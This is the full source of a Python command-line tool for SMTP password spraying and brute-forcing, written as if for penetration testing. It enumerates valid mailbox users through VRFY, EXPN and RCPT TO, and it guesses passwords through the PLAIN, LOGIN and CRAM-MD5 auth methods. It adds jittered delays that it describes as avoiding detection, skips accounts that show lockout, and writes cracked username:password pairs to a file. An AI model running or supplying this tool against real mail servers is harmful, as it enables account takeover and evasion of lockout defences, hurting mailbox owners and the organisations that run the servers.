#!/usr/bin/env python3
"""
SMTP Password Spray & Brute Force Tool
For authorized penetration testing engagements only.

Features:
- Multi-port support (25, 465, 587)
- TLS/STARTTLS/Implicit SSL
- Multiple auth methods (PLAIN, LOGIN, CRAM-MD5)
- Configurable rate limiting with jitter
- Progress saving and resume capability
- User enumeration (VRFY, EXPN, RCPT TO)
- Lockout detection
- Detailed logging

Author: Security Testing Tool
License: For authorized use only
"""

import argparse
import asyncio
import base64
import hashlib
import hmac
import json
import logging
import os
import random
import re
import signal
import smtplib
import socket
import ssl
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Set


# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

VERSION = "1.0.0"
BANNER = f"""
╔═══════════════════════════════════════════════════════════════════╗
║                    SMTP Spray Tool v{VERSION}                        ║
║              For Authorized Security Testing Only                 ║
╚═══════════════════════════════════════════════════════════════════╝
"""

class AuthMethod(Enum):
    PLAIN = "PLAIN"
    LOGIN = "LOGIN"
    CRAM_MD5 = "CRAM-MD5"
    AUTO = "AUTO"

class EnumMethod(Enum):
    VRFY = "VRFY"
    EXPN = "EXPN"
    RCPT = "RCPT"

class SprayMode(Enum):
    SPRAY = "spray"      # One password against all users
    BRUTE = "brute"      # All passwords against one user

class ConnectionType(Enum):
    PLAIN = "plain"           # Port 25, no encryption
    STARTTLS = "starttls"     # Port 587, upgrade to TLS
    SSL = "ssl"               # Port 465, implicit TLS


# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class Target:
    host: str
    port: int = 587
    connection_type: ConnectionType = ConnectionType.STARTTLS
    timeout: int = 30

@dataclass
class Credential:
    username: str
    password: str

@dataclass
class AttemptResult:
    username: str
    password: str
    success: bool
    timestamp: str
    response_code: int = 0
    response_message: str = ""
    auth_method: str = ""
    lockout_detected: bool = False

@dataclass
class SprayProgress:
    """Track spray progress for resume capability"""
    target_host: str
    target_port: int
    current_password_index: int = 0
    current_user_index: int = 0
    completed_users: Set[str] = field(default_factory=set)
    successful_creds: List[Dict] = field(default_factory=list)
    locked_users: Set[str] = field(default_factory=set)
    total_attempts: int = 0
    start_time: str = ""

    def to_dict(self):
        return {
            "target_host": self.target_host,
            "target_port": self.target_port,
            "current_password_index": self.current_password_index,
            "current_user_index": self.current_user_index,
            "completed_users": list(self.completed_users),
            "successful_creds": self.successful_creds,
            "locked_users": list(self.locked_users),
            "total_attempts": self.total_attempts,
            "start_time": self.start_time
        }

    @classmethod
    def from_dict(cls, data: dict):
        return cls(
            target_host=data["target_host"],
            target_port=data["target_port"],
            current_password_index=data.get("current_password_index", 0),
            current_user_index=data.get("current_user_index", 0),
            completed_users=set(data.get("completed_users", [])),
            successful_creds=data.get("successful_creds", []),
            locked_users=set(data.get("locked_users", [])),
            total_attempts=data.get("total_attempts", 0),
            start_time=data.get("start_time", "")
        )


# ============================================================================
# RATE LIMITER
# ============================================================================

class RateLimiter:
    """
    Configurable rate limiter with jitter to avoid detection.
    """

    def __init__(
        self,
        delay_between_attempts: float = 1.0,
        delay_between_users: float = 0.5,
        delay_between_passwords: float = 1800.0,  # 30 minutes
        jitter_min: float = 0.1,
        jitter_max: float = 0.5,
        max_attempts_per_user: int = 3,
        lockout_threshold: int = 5
    ):
        self.delay_between_attempts = delay_between_attempts
        self.delay_between_users = delay_between_users
        self.delay_between_passwords = delay_between_passwords
        self.jitter_min = jitter_min
        self.jitter_max = jitter_max
        self.max_attempts_per_user = max_attempts_per_user
        self.lockout_threshold = lockout_threshold

        self.user_attempt_counts: Dict[str, int] = {}
        self.last_attempt_time: float = 0

    def _add_jitter(self, delay: float) -> float:
        """Add random jitter to delay"""
        jitter = random.uniform(self.jitter_min, self.jitter_max)
        return delay * (1 + jitter)

    async def wait_between_attempts(self):
        """Wait between individual attempts"""
        delay = self._add_jitter(self.delay_between_attempts)
        await asyncio.sleep(delay)

    async def wait_between_users(self):
        """Wait when moving to next user"""
        delay = self._add_jitter(self.delay_between_users)
        await asyncio.sleep(delay)

    async def wait_between_passwords(self):
        """Wait between password rounds (spray mode)"""
        delay = self._add_jitter(self.delay_between_passwords)
        logging.info(f"Waiting {delay/60:.1f} minutes before next password round...")
        await asyncio.sleep(delay)

    def record_attempt(self, username: str) -> bool:
        """
        Record an attempt for a user.
        Returns False if user should be skipped (too many attempts).
        """
        self.user_attempt_counts[username] = self.user_attempt_counts.get(username, 0) + 1
        return self.user_attempt_counts[username] <= self.max_attempts_per_user

    def should_skip_user(self, username: str) -> bool:
        """Check if user has exceeded attempt threshold"""
        return self.user_attempt_counts.get(username, 0) >= self.max_attempts_per_user

    def reset_user_count(self, username: str):
        """Reset attempt count for a user"""
        self.user_attempt_counts[username] = 0


# ============================================================================
# SMTP CONNECTION MANAGER
# ============================================================================

class SMTPConnectionManager:
    """
    Manages SMTP connections with support for different encryption modes.
    """

    LOCKOUT_PATTERNS = [
        r"too many.*(?:auth|login|attempt)",
        r"account.*(?:locked|disabled|blocked)",
        r"temporarily.*(?:blocked|banned)",
        r"rate.*limit",
        r"try.*again.*later",
        r"maximum.*attempts",
        r"authentication.*(?:throttl|limit)",
    ]

    def __init__(self, target: Target, logger: logging.Logger):
        self.target = target
        self.logger = logger
        self.connection: Optional[smtplib.SMTP] = None
        self.supported_auth_methods: List[str] = []

    def _create_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context for secure connections"""
        context = ssl.create_default_context()
        # For testing, you may need to disable verification
        # context.check_hostname = False
        # context.verify_mode = ssl.CERT_NONE
        return context

    def connect(self) -> bool:
        """Establish connection to SMTP server"""
        try:
            if self.target.connection_type == ConnectionType.SSL:
                # Implicit TLS (port 465)
                context = self._create_ssl_context()
                self.connection = smtplib.SMTP_SSL(
                    self.target.host,
                    self.target.port,
                    timeout=self.target.timeout,
                    context=context
                )
            else:
                # Plain or STARTTLS
                self.connection = smtplib.SMTP(
                    self.target.host,
                    self.target.port,
                    timeout=self.target.timeout
                )

            # Send EHLO and get capabilities
            code, msg = self.connection.ehlo()
            if code != 250:
                self.logger.error(f"EHLO failed: {code} {msg}")
                return False

            # Upgrade to TLS if using STARTTLS
            if self.target.connection_type == ConnectionType.STARTTLS:
                if self.connection.has_extn('STARTTLS'):
                    context = self._create_ssl_context()
                    self.connection.starttls(context=context)
                    self.connection.ehlo()  # Re-identify after STARTTLS
                else:
                    self.logger.warning("Server doesn't support STARTTLS")

            # Get supported auth methods
            self._get_auth_methods()
            return True

        except Exception as e:
            self.logger.error(f"Connection failed: {e}")
            return False

    def _get_auth_methods(self):
        """Extract supported authentication methods"""
        self.supported_auth_methods = []
        if self.connection and self.connection.has_extn('AUTH'):
            auth_ext = self.connection.esmtp_features.get('auth', '')
            self.supported_auth_methods = auth_ext.upper().split()
            self.logger.debug(f"Supported auth methods: {self.supported_auth_methods}")

    def disconnect(self):
        """Close the SMTP connection"""
        if self.connection:
            try:
                self.connection.quit()
            except:
                pass
            self.connection = None

    def _encode_plain(self, username: str, password: str) -> str:
        """Encode credentials for AUTH PLAIN"""
        auth_string = f"\x00{username}\x00{password}"
        return base64.b64encode(auth_string.encode()).decode()

    def _encode_login(self, value: str) -> str:
        """Encode value for AUTH LOGIN"""
        return base64.b64encode(value.encode()).decode()

    def _compute_cram_md5(self, challenge: bytes, password: str) -> str:
        """Compute CRAM-MD5 response"""
        decoded_challenge = base64.b64decode(challenge)
        digest = hmac.new(
            password.encode(),
            decoded_challenge,
            hashlib.md5
        ).hexdigest()
        return digest

    def _is_lockout_response(self, response: str) -> bool:
        """Check if response indicates account lockout"""
        response_lower = response.lower()
        for pattern in self.LOCKOUT_PATTERNS:
            if re.search(pattern, response_lower):
                return True
        return False

    def authenticate(
        self,
        username: str,
        password: str,
        method: AuthMethod = AuthMethod.AUTO
    ) -> AttemptResult:
        """
        Attempt authentication with specified method.
        Returns AttemptResult with success status and details.
        """
        timestamp = datetime.now().isoformat()

        if not self.connection:
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_message="No connection"
            )

        # Determine auth method
        if method == AuthMethod.AUTO:
            method = self._select_best_auth_method()

        try:
            if method == AuthMethod.PLAIN:
                return self._auth_plain(username, password, timestamp)
            elif method == AuthMethod.LOGIN:
                return self._auth_login(username, password, timestamp)
            elif method == AuthMethod.CRAM_MD5:
                return self._auth_cram_md5(username, password, timestamp)
            else:
                # Fallback to smtplib's login
                return self._auth_default(username, password, timestamp)

        except smtplib.SMTPAuthenticationError as e:
            lockout = self._is_lockout_response(str(e))
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_code=e.smtp_code,
                response_message=str(e.smtp_error),
                auth_method=method.value if isinstance(method, AuthMethod) else str(method),
                lockout_detected=lockout
            )
        except Exception as e:
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_message=str(e),
                auth_method=method.value if isinstance(method, AuthMethod) else str(method)
            )

    def _select_best_auth_method(self) -> AuthMethod:
        """Select best available auth method"""
        if "CRAM-MD5" in self.supported_auth_methods:
            return AuthMethod.CRAM_MD5
        elif "PLAIN" in self.supported_auth_methods:
            return AuthMethod.PLAIN
        elif "LOGIN" in self.supported_auth_methods:
            return AuthMethod.LOGIN
        return AuthMethod.LOGIN  # Default fallback

    def _auth_plain(self, username: str, password: str, timestamp: str) -> AttemptResult:
        """AUTH PLAIN authentication"""
        encoded = self._encode_plain(username, password)
        code, msg = self.connection.docmd("AUTH PLAIN", encoded)

        success = code == 235
        lockout = self._is_lockout_response(msg.decode() if isinstance(msg, bytes) else str(msg))

        return AttemptResult(
            username=username,
            password=password,
            success=success,
            timestamp=timestamp,
            response_code=code,
            response_message=msg.decode() if isinstance(msg, bytes) else str(msg),
            auth_method="PLAIN",
            lockout_detected=lockout
        )

    def _auth_login(self, username: str, password: str, timestamp: str) -> AttemptResult:
        """AUTH LOGIN authentication"""
        code, msg = self.connection.docmd("AUTH LOGIN")
        if code != 334:
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_code=code,
                response_message=msg.decode() if isinstance(msg, bytes) else str(msg),
                auth_method="LOGIN"
            )

        # Send username
        code, msg = self.connection.docmd(self._encode_login(username))
        if code != 334:
            lockout = self._is_lockout_response(msg.decode() if isinstance(msg, bytes) else str(msg))
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_code=code,
                response_message=msg.decode() if isinstance(msg, bytes) else str(msg),
                auth_method="LOGIN",
                lockout_detected=lockout
            )

        # Send password
        code, msg = self.connection.docmd(self._encode_login(password))
        success = code == 235
        lockout = self._is_lockout_response(msg.decode() if isinstance(msg, bytes) else str(msg))

        return AttemptResult(
            username=username,
            password=password,
            success=success,
            timestamp=timestamp,
            response_code=code,
            response_message=msg.decode() if isinstance(msg, bytes) else str(msg),
            auth_method="LOGIN",
            lockout_detected=lockout
        )

    def _auth_cram_md5(self, username: str, password: str, timestamp: str) -> AttemptResult:
        """AUTH CRAM-MD5 authentication"""
        code, challenge = self.connection.docmd("AUTH CRAM-MD5")
        if code != 334:
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_code=code,
                response_message=challenge.decode() if isinstance(challenge, bytes) else str(challenge),
                auth_method="CRAM-MD5"
            )

        # Compute response
        digest = self._compute_cram_md5(challenge, password)
        response = f"{username} {digest}"
        encoded_response = base64.b64encode(response.encode()).decode()

        code, msg = self.connection.docmd(encoded_response)
        success = code == 235
        lockout = self._is_lockout_response(msg.decode() if isinstance(msg, bytes) else str(msg))

        return AttemptResult(
            username=username,
            password=password,
            success=success,
            timestamp=timestamp,
            response_code=code,
            response_message=msg.decode() if isinstance(msg, bytes) else str(msg),
            auth_method="CRAM-MD5",
            lockout_detected=lockout
        )

    def _auth_default(self, username: str, password: str, timestamp: str) -> AttemptResult:
        """Use smtplib's built-in login method"""
        try:
            self.connection.login(username, password)
            return AttemptResult(
                username=username,
                password=password,
                success=True,
                timestamp=timestamp,
                response_code=235,
                response_message="Authentication successful",
                auth_method="AUTO"
            )
        except smtplib.SMTPAuthenticationError as e:
            lockout = self._is_lockout_response(str(e))
            return AttemptResult(
                username=username,
                password=password,
                success=False,
                timestamp=timestamp,
                response_code=e.smtp_code,
                response_message=str(e.smtp_error),
                auth_method="AUTO",
                lockout_detected=lockout
            )


# ============================================================================
# USER ENUMERATION
# ============================================================================

class UserEnumerator:
    """
    Enumerate valid users via VRFY, EXPN, or RCPT TO commands.
    """

    def __init__(self, target: Target, logger: logging.Logger):
        self.target = target
        self.logger = logger
        self.connection: Optional[smtplib.SMTP] = None

    def connect(self) -> bool:
        """Establish connection for enumeration"""
        try:
            if self.target.connection_type == ConnectionType.SSL:
                context = ssl.create_default_context()
                self.connection = smtplib.SMTP_SSL(
                    self.target.host,
                    self.target.port,
                    timeout=self.target.timeout,
                    context=context
                )
            else:
                self.connection = smtplib.SMTP(
                    self.target.host,
                    self.target.port,
                    timeout=self.target.timeout
                )
            self.connection.ehlo()

            if self.target.connection_type == ConnectionType.STARTTLS:
                if self.connection.has_extn('STARTTLS'):
                    self.connection.starttls()
                    self.connection.ehlo()
            return True
        except Exception as e:
            self.logger.error(f"Enumeration connection failed: {e}")
            return False

    def disconnect(self):
        """Close connection"""
        if self.connection:
            try:
                self.connection.quit()
            except:
                pass
            self.connection = None

    def enumerate_user(self, username: str, method: EnumMethod = EnumMethod.RCPT) -> Tuple[bool, str]:
        """
        Check if a user exists.
        Returns (exists: bool, response: str)
        """
        if not self.connection:
            return False, "No connection"

        try:
            if method == EnumMethod.VRFY:
                code, msg = self.connection.verify(username)
            elif method == EnumMethod.EXPN:
                code, msg = self.connection.docmd("EXPN", username)
            else:  # RCPT TO
                # Need to set up MAIL FROM first
                self.connection.docmd("MAIL FROM:", "<test@test.com>")
                code, msg = self.connection.docmd("RCPT TO:", f"<{username}>")
                self.connection.docmd("RSET")  # Reset for next check

            msg_str = msg.decode() if isinstance(msg, bytes) else str(msg)

            # Response codes:
            # 250, 251, 252 - User exists
            # 550, 551, 553 - User doesn't exist
            exists = code in [250, 251, 252]

            return exists, f"{code} {msg_str}"

        except Exception as e:
            return False, str(e)

    def enumerate_users(
        self,
        usernames: List[str],
        method: EnumMethod = EnumMethod.RCPT,
        delay: float = 0.5
    ) -> Dict[str, Tuple[bool, str]]:
        """Enumerate multiple users"""
        results = {}
        for username in usernames:
            exists, response = self.enumerate_user(username, method)
            results[username] = (exists, response)
            self.logger.info(f"[{'FOUND' if exists else 'NOT FOUND'}] {username}: {response}")
            time.sleep(delay)
        return results


# ============================================================================
# SPRAY CONTROLLER
# ============================================================================

class SprayController:
    """
    Main controller for password spraying operations.
    """

    def __init__(
        self,
        target: Target,
        usernames: List[str],
        passwords: List[str],
        rate_limiter: RateLimiter,
        logger: logging.Logger,
        auth_method: AuthMethod = AuthMethod.AUTO,
        mode: SprayMode = SprayMode.SPRAY,
        output_file: Optional[str] = None,
        progress_file: Optional[str] = None
    ):
        self.target = target
        self.usernames = usernames
        self.passwords = passwords
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.auth_method = auth_method
        self.mode = mode
        self.output_file = output_file
        self.progress_file = progress_file or f"progress_{target.host}_{target.port}.json"

        self.progress = SprayProgress(
            target_host=target.host,
            target_port=target.port,
            start_time=datetime.now().isoformat()
        )

        self.running = True
        self.connection_manager: Optional[SMTPConnectionManager] = None

    def _save_progress(self):
        """Save current progress to file"""
        try:
            with open(self.progress_file, 'w') as f:
                json.dump(self.progress.to_dict(), f, indent=2)
        except Exception as e:
            self.logger.error(f"Failed to save progress: {e}")

    def _load_progress(self) -> bool:
        """Load progress from file if exists"""
        try:
            if os.path.exists(self.progress_file):
                with open(self.progress_file, 'r') as f:
                    data = json.load(f)
                self.progress = SprayProgress.from_dict(data)
                self.logger.info(f"Resumed from progress file: {self.progress_file}")
                return True
        except Exception as e:
            self.logger.error(f"Failed to load progress: {e}")
        return False

    def _save_result(self, result: AttemptResult):
        """Save successful result to output file"""
        if self.output_file and result.success:
            try:
                with open(self.output_file, 'a') as f:
                    f.write(f"{result.username}:{result.password}\n")
            except Exception as e:
                self.logger.error(f"Failed to save result: {e}")

    def _log_result(self, result: AttemptResult):
        """Log attempt result"""
        status = "SUCCESS" if result.success else "FAILED"
        lockout = " [LOCKOUT DETECTED]" if result.lockout_detected else ""

        if result.success:
            self.logger.info(
                f"[{status}] {result.username}:{result.password} "
                f"({result.auth_method}){lockout}"
            )
        else:
            self.logger.debug(
                f"[{status}] {result.username}:{result.password} "
                f"- {result.response_code} {result.response_message}{lockout}"
            )

    def _connect(self) -> bool:
        """Establish connection"""
        self.connection_manager = SMTPConnectionManager(self.target, self.logger)
        return self.connection_manager.connect()

    def _reconnect(self) -> bool:
        """Reconnect to server"""
        if self.connection_manager:
            self.connection_manager.disconnect()
        return self._connect()

    async def run_spray(self, resume: bool = False) -> List[AttemptResult]:
        """
        Run password spray attack (one password against all users).
        """
        results = []

        if resume:
            self._load_progress()

        if not self._connect():
            self.logger.error("Initial connection failed")
            return results

        self.logger.info(f"Starting spray against {self.target.host}:{self.target.port}")
        self.logger.info(f"Users: {len(self.usernames)}, Passwords: {len(self.passwords)}")
        self.logger.info(f"Auth method: {self.auth_method.value}")

        start_pwd_idx = self.progress.current_password_index

        for pwd_idx, password in enumerate(self.passwords[start_pwd_idx:], start=start_pwd_idx):
            if not self.running:
                break

            self.progress.current_password_index = pwd_idx
            self.logger.info(f"\n[Round {pwd_idx + 1}/{len(self.passwords)}] Testing password: {password}")

            start_user_idx = self.progress.current_user_index if pwd_idx == start_pwd_idx else 0

            for user_idx, username in enumerate(self.usernames[start_user_idx:], start=start_user_idx):
                if not self.running:
                    break

                # Skip locked users
                if username in self.progress.locked_users:
                    self.logger.debug(f"Skipping locked user: {username}")
                    continue

                # Skip if too many attempts
                if self.rate_limiter.should_skip_user(username):
                    self.logger.debug(f"Skipping user (max attempts): {username}")
                    continue

                self.progress.current_user_index = user_idx

                # Attempt authentication
                try:
                    result = self.connection_manager.authenticate(
                        username, password, self.auth_method
                    )
                except Exception as e:
                    self.logger.warning(f"Auth error, reconnecting: {e}")
                    if not self._reconnect():
                        self.logger.error("Reconnection failed, stopping")
                        break
                    continue

                results.append(result)
                self.progress.total_attempts += 1
                self._log_result(result)

                # Handle results
                if result.success:
                    self.progress.successful_creds.append({
                        "username": username,
                        "password": password,
                        "timestamp": result.timestamp
                    })
                    self._save_result(result)

                if result.lockout_detected:
                    self.progress.locked_users.add(username)
                    self.logger.warning(f"Lockout detected for {username}, skipping")

                self.rate_limiter.record_attempt(username)

                # Rate limiting
                await self.rate_limiter.wait_between_attempts()

                # Save progress periodically
                if self.progress.total_attempts % 10 == 0:
                    self._save_progress()

            # Reset user index for next password round
            self.progress.current_user_index = 0

            # Wait between password rounds (if not last password)
            if pwd_idx < len(self.passwords) - 1 and self.running:
                await self.rate_limiter.wait_between_passwords()

        # Final save
        self._save_progress()

        if self.connection_manager:
            self.connection_manager.disconnect()

        return results

    async def run_brute(self, resume: bool = False) -> List[AttemptResult]:
        """
        Run brute force attack (all passwords against each user).
        WARNING: Higher lockout risk!
        """
        results = []

        if resume:
            self._load_progress()

        if not self._connect():
            self.logger.error("Initial connection failed")
            return results

        self.logger.info(f"Starting brute force against {self.target.host}:{self.target.port}")
        self.logger.warning("WARNING: Brute force mode has higher lockout risk!")

        for user_idx, username in enumerate(self.usernames):
            if not self.running:
                break

            if username in self.progress.locked_users:
                continue

            self.logger.info(f"\n[User {user_idx + 1}/{len(self.usernames)}] Testing: {username}")

            for password in self.passwords:
                if not self.running:
                    break

                if self.rate_limiter.should_skip_user(username):
                    break

                try:
                    result = self.connection_manager.authenticate(
                        username, password, self.auth_method
                    )
                except Exception as e:
                    self.logger.warning(f"Auth error, reconnecting: {e}")
                    if not self._reconnect():
                        break
                    continue

                results.append(result)
                self.progress.total_attempts += 1
                self._log_result(result)

                if result.success:
                    self.progress.successful_creds.append({
                        "username": username,
                        "password": password
                    })
                    self._save_result(result)
                    break  # Found password, move to next user

                if result.lockout_detected:
                    self.progress.locked_users.add(username)
                    break

                self.rate_limiter.record_attempt(username)
                await self.rate_limiter.wait_between_attempts()

            await self.rate_limiter.wait_between_users()
            self._save_progress()

        self._save_progress()

        if self.connection_manager:
            self.connection_manager.disconnect()

        return results

    def stop(self):
        """Stop the spray operation"""
        self.running = False
        self._save_progress()
        self.logger.info("Stopping spray operation...")


# ============================================================================
# LOGGING SETUP
# ============================================================================

def setup_logging(verbose: bool = False, log_file: Optional[str] = None) -> logging.Logger:
    """Configure logging"""
    logger = logging.getLogger("smtp_spray")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)

    # Console handler
    console = logging.StreamHandler()
    console.setLevel(logging.DEBUG if verbose else logging.INFO)
    console_format = logging.Formatter(
        '%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )
    console.setFormatter(console_format)
    logger.addHandler(console)

    # File handler
    if log_file:
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        file_format = logging.Formatter(
            '%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(file_format)
        logger.addHandler(file_handler)

    return logger


# ============================================================================
# CLI INTERFACE
# ============================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="SMTP Password Spray & Brute Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Password spray against port 587
  python smtp_spray.py -t mail.target.com -U users.txt -P passwords.txt

  # Single user brute force
  python smtp_spray.py -t mail.target.com -u admin@target.com -P passwords.txt --mode brute

  # User enumeration
  python smtp_spray.py -t mail.target.com -U users.txt --enumerate --enum-method RCPT

  # Custom rate limiting
  python smtp_spray.py -t mail.target.com -U users.txt -P passwords.txt \\
      --delay 2 --spray-delay 3600 --jitter 0.3

  # Resume interrupted spray
  python smtp_spray.py -t mail.target.com -U users.txt -P passwords.txt --resume
        """
    )

    # Target options
    target_group = parser.add_argument_group("Target Options")
    target_group.add_argument("-t", "--target", required=True, help="Target SMTP server")
    target_group.add_argument("-p", "--port", type=int, default=587,
                              help="SMTP port (default: 587)")
    target_group.add_argument("--ssl", action="store_true",
                              help="Use implicit SSL (port 465)")
    target_group.add_argument("--no-tls", action="store_true",
                              help="Don't use STARTTLS (plain connection)")
    target_group.add_argument("--timeout", type=int, default=30,
                              help="Connection timeout in seconds (default: 30)")

    # Credentials
    cred_group = parser.add_argument_group("Credentials")
    cred_group.add_argument("-u", "--user", help="Single username to test")
    cred_group.add_argument("-U", "--userfile", help="File containing usernames")
    cred_group.add_argument("-P", "--passfile", help="File containing passwords")
    cred_group.add_argument("--password", help="Single password to test")

    # Attack mode
    mode_group = parser.add_argument_group("Attack Mode")
    mode_group.add_argument("--mode", choices=["spray", "brute"], default="spray",
                            help="Attack mode (default: spray)")
    mode_group.add_argument("--auth", choices=["AUTO", "PLAIN", "LOGIN", "CRAM-MD5"],
                            default="AUTO", help="Authentication method (default: AUTO)")

    # Enumeration
    enum_group = parser.add_argument_group("User Enumeration")
    enum_group.add_argument("--enumerate", action="store_true",
                            help="Enumerate users instead of spraying")
    enum_group.add_argument("--enum-method", choices=["VRFY", "EXPN", "RCPT"],
                            default="RCPT", help="Enumeration method (default: RCPT)")

    # Rate limiting
    rate_group = parser.add_argument_group("Rate Limiting")
    rate_group.add_argument("--delay", type=float, default=1.0,
                            help="Delay between attempts in seconds (default: 1.0)")
    rate_group.add_argument("--spray-delay", type=float, default=1800,
                            help="Delay between password rounds in seconds (default: 1800)")
    rate_group.add_argument("--jitter", type=float, default=0.3,
                            help="Jitter factor 0-1 (default: 0.3)")
    rate_group.add_argument("--max-attempts", type=int, default=3,
                            help="Max attempts per user (default: 3)")

    # Output
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument("-o", "--output", help="Output file for valid credentials")
    output_group.add_argument("--log", help="Log file path")
    output_group.add_argument("-v", "--verbose", action="store_true",
                              help="Verbose output")

    # Resume
    parser.add_argument("--resume", action="store_true",
                        help="Resume from progress file")
    parser.add_argument("--progress-file", help="Custom progress file path")

    return parser.parse_args()


def load_file_lines(filepath: str) -> List[str]:
    """Load lines from a file"""
    lines = []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                lines.append(line)
    return lines


async def main():
    args = parse_args()

    print(BANNER)

    # Setup logging
    logger = setup_logging(args.verbose, args.log)

    # Determine connection type
    if args.ssl:
        conn_type = ConnectionType.SSL
        port = args.port if args.port != 587 else 465
    elif args.no_tls:
        conn_type = ConnectionType.PLAIN
        port = args.port if args.port != 587 else 25
    else:
        conn_type = ConnectionType.STARTTLS
        port = args.port

    # Create target
    target = Target(
        host=args.target,
        port=port,
        connection_type=conn_type,
        timeout=args.timeout
    )

    logger.info(f"Target: {target.host}:{target.port} ({target.connection_type.value})")

    # Load usernames
    usernames = []
    if args.user:
        usernames = [args.user]
    elif args.userfile:
        usernames = load_file_lines(args.userfile)

    if not usernames:
        logger.error("No usernames provided. Use -u or -U")
        sys.exit(1)

    # User enumeration mode
    if args.enumerate:
        logger.info(f"Enumerating {len(usernames)} users via {args.enum_method}")
        enumerator = UserEnumerator(target, logger)
        if enumerator.connect():
            method = EnumMethod[args.enum_method]
            results = enumerator.enumerate_users(usernames, method, args.delay)
            enumerator.disconnect()

            # Output valid users
            valid_users = [u for u, (exists, _) in results.items() if exists]
            logger.info(f"\nFound {len(valid_users)} valid users")

            if args.output and valid_users:
                with open(args.output, 'w') as f:
                    f.write('\n'.join(valid_users))
                logger.info(f"Valid users saved to {args.output}")
        else:
            logger.error("Failed to connect for enumeration")
        return

    # Load passwords
    passwords = []
    if args.password:
        passwords = [args.password]
    elif args.passfile:
        passwords = load_file_lines(args.passfile)

    if not passwords:
        logger.error("No passwords provided. Use --password or -P")
        sys.exit(1)

    # Create rate limiter
    rate_limiter = RateLimiter(
        delay_between_attempts=args.delay,
        delay_between_passwords=args.spray_delay,
        jitter_min=0.1,
        jitter_max=args.jitter,
        max_attempts_per_user=args.max_attempts
    )

    # Create spray controller
    controller = SprayController(
        target=target,
        usernames=usernames,
        passwords=passwords,
        rate_limiter=rate_limiter,
        logger=logger,
        auth_method=AuthMethod[args.auth],
        mode=SprayMode[args.mode.upper()],
        output_file=args.output,
        progress_file=args.progress_file
    )

    # Handle CTRL+C
    def signal_handler(sig, frame):
        logger.warning("\nInterrupted! Saving progress...")
        controller.stop()

    signal.signal(signal.SIGINT, signal_handler)

    # Run attack
    try:
        if args.mode == "spray":
            results = await controller.run_spray(resume=args.resume)
        else:
            results = await controller.run_brute(resume=args.resume)

        # Summary
        successful = [r for r in results if r.success]
        lockouts = [r for r in results if r.lockout_detected]

        logger.info("\n" + "="*60)
        logger.info("SPRAY COMPLETE")
        logger.info("="*60)
        logger.info(f"Total attempts: {len(results)}")
        logger.info(f"Successful: {len(successful)}")
        logger.info(f"Lockouts detected: {len(lockouts)}")

        if successful:
            logger.info("\nValid credentials found:")
            for r in successful:
                logger.info(f"  {r.username}:{r.password}")

    except Exception as e:
        logger.error(f"Error during spray: {e}")
        raise


if __name__ == "__main__":
    asyncio.run(main())
